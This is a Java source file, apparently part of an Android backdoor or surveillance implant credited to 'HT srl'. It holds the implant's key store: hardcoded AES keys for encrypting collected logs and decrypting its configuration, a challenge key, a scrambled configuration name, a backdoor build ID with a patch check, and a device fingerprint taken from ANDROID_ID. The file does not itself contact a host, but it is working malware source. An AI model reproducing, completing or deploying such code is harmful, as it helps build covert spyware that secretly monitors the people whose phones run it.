/* *********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.service.crypto;

import android.provider.Settings.Secure;

import com.android.service.Status;
import com.android.service.util.Utils;

// TODO: Auto-generated Javadoc
// This class should only be read by Device
/**
 * The Class Keys.
 */
public class Keys {

	/** The use fake. */
	static boolean useFake = true;

	/** The singleton. */
	private volatile static Keys singleton;

	/**
	 * Self.
	 * 
	 * @return the keys
	 */
	public static Keys self() {
		if (singleton == null) {
			synchronized (Keys.class) {
				if (singleton == null) {
					if (useFake) {
						singleton = new KeysFake();
					} else {
						singleton = new Keys();
					}
				}
			}
		}

		return singleton;
	}

	// Subversion
	/** The Constant g_Subtype. */
	private static final byte[] g_Subtype = { 'A', 'N', 'D', 'R', 'O', 'I', 'D' };
	// private static final byte[] g_Subtype = { 'A', 'N', 'D', 'R', 'O', 'I',
	// 'D' };

	// AES key used to encrypt logs
	/** The Constant g_AesKey. */
	private static final byte[] g_AesKey = { '3', 'j', '9', 'W', 'm', 'm', 'D',
			'g', 'B', 'q', 'y', 'U', '2', '7', '0', 'F', 'T', 'i', 'd', '3',
			'7', '1', '9', 'g', '6', '4', 'b', 'P', '4', 's', '5', '2' };

	// AES key used to decrypt configuration
	/** The Constant g_ConfKey. */
	private static final byte[] g_ConfKey = { 'A', 'd', 'f', '5', 'V', '5',
			'7', 'g', 'Q', 't', 'y', 'i', '9', '0', 'w', 'U', 'h', 'p', 'b',
			'8', 'N', 'e', 'g', '5', '6', '7', '5', '6', 'j', '8', '7', 'R' };

	// 20 bytes that uniquely identifies the device (non-static on purpose)
	/** The g_ instance id. */
	private final byte[] g_InstanceId = { 'b', 'g', '5', 'e', 't', 'G', '8',
			'7', 'q', '2', '0', 'K', 'g', '5', '2', 'W', '5', 'F', 'g', '1' };

	// 16 bytes that uniquely identifies the backdoor, NULL-terminated
	/** The Constant g_BackdoorID. */
	private static final byte[] g_BackdoorID = { 'a', 'v', '3', 'p', 'V', 'c',
			'k', '1', 'g', 'b', '4', 'e', 'R', '2', 'd', '8', 0 };

	// Challenge key
	/** The Constant g_Challenge. */
	private static final byte[] g_Challenge = { 'f', '7', 'H', 'k', '0', 'f',
			'5', 'u', 's', 'd', '0', '4', 'a', 'p', 'd', 'v', 'q', 'w', '1',
			'3', 'F', '5', 'e', 'd', '2', '5', 's', 'o', 'V', '5', 'e', 'D' };

	// Configuration name, scrambled using the first byte of g_Challenge[]
	/** The Constant g_ConfName. */
	private static final String g_ConfName = "c3mdX053du1YJ541vqWILrc4Ff71pViL";

	/**
	 * Checks for been binary patched.
	 * 
	 * @return true, if successful
	 */
	public boolean hasBeenBinaryPatched() {
		return Utils.equals(g_BackdoorID, 0, new byte[] { 'a', 'v', '3', 'p',
				'V', 'c', 'k', '1', 'g', 'b', '4', 'e' }, 0, 12);
	}

	/**
	 * Gets the aes key.
	 * 
	 * @return the aes key
	 */
	public byte[] getAesKey() {
		return g_AesKey;
	}

	/**
	 * Gets the challenge key.
	 * 
	 * @return the challenge key
	 */
	public byte[] getChallengeKey() {
		return g_Challenge;
	}

	/**
	 * Gets the conf key.
	 * 
	 * @return the conf key
	 */
	public byte[] getConfKey() {
		return g_ConfKey;
	}

	/**
	 * Gets the instance id.
	 * 
	 * @return the instance id
	 */
	public byte[] getInstanceId() {
		final String android_id = Secure.getString(Status.getAppContext()
				.getContentResolver(), Secure.ANDROID_ID);

		return Encryption.SHA1(android_id.getBytes());
	}

	/**
	 * Gets the builds the id.
	 * 
	 * @return the builds the id
	 */
	public byte[] getBuildId() {
		return g_BackdoorID;
	}

	/**
	 * Gets the subtype.
	 * 
	 * @return the subtype
	 */
	public byte[] getSubtype() {
		// return g_Subtype;
		// TODO fix to ANDROID!
		return "ANDROID".getBytes();
	}

}
